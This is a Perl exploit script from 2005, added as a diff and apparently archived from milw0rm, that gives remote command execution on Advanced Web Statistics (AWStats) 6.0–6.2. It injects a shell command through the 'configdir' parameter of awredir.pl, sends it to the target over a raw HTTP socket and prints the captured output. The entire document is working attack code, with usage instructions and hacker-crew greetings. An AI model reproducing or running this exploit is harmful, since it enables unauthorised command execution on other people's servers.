@@ -1,0 +1,76 @@
+#!/usr/bin/perl
+#---GHC---------------------------------#
+#Remote command execution exploit #
+#Product:                                        #
+#Advanced Web Statistics 6.0 - 6.2    #
+#URL:http://awstats.sourceforge.net  #
+#Greets & respects to our friends:     #
+#1dt.w0lf and all rst.void.ru              #
+#Special greets 2 d0G4                    #
+#& cr0n for link on bugtraq               #
+#---not-PRIVATE-already--------------#
+# bug found by iDEFENSE                 #
+# http://www.idefense.com/             #
+# application/poi/display?                 #
+# id=185&type=vulnerabilities          #
+# &flashstatus=true                         #
+#-----------------------------------------#
+
+use IO::Socket;
+$banner = "
+#################################################################
+GHC 2005
+Remote command execution exploit for:
+Advanced Web Statistics 6.0 - 6.2
+Usage:
+>perl ./GHCaws.pl www.server.net /cgi-bin/awredir.pl \"uname -a\"
+#################################################################
+";
+
+$bug_param = 'configdir';
+$id_start = 'b_exp';
+$id_exit = 'e_exp';
+$id_print = 0;
+$http_head = "\n\n";
+
+sub Print_Report {
+$str = $_[0];
+if ($str =~ m/$id_exit/i) {
+exit;
+}
+if ($str =~ m/$id_start/i) {
+$str =~ s/$id_start//ig;
+$id_print = 1;
+}
+if ($id_print == 1) {
+print "$str";
+}
+}
+
+sub ConnectServer {
+$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$server", PeerPort => "80")
+|| die "Error\n";
+print $socket "GET $dir".'?'.$bug_param.'='."$expl HTTP/1.1\n";
+print $socket "Host: $server\n";
+print $socket "Accept: */*\n";
+print $socket "Connection: close\n\n";
+while ($report = <$socket>) {
+&Print_Report("$report");
+}
+}
+
+
+print "$banner";
+if ($ARGV[0] && $ARGV[1] && $ARGV[2]) {
+$server = $ARGV[0];
+$dir = $ARGV[1];
+$cmd = $ARGV[2]; }
+else {
+exit;
+}
+
+$expl = '|echo '.''.';echo '.$id_start.';'.$cmd.';echo '.$id_exit.';%00';
+$expl =~ s/\W/"%".sprintf("%x",ord($&))/eg;
+&ConnectServer;
+
+# milw0rm.com [2005-01-25]
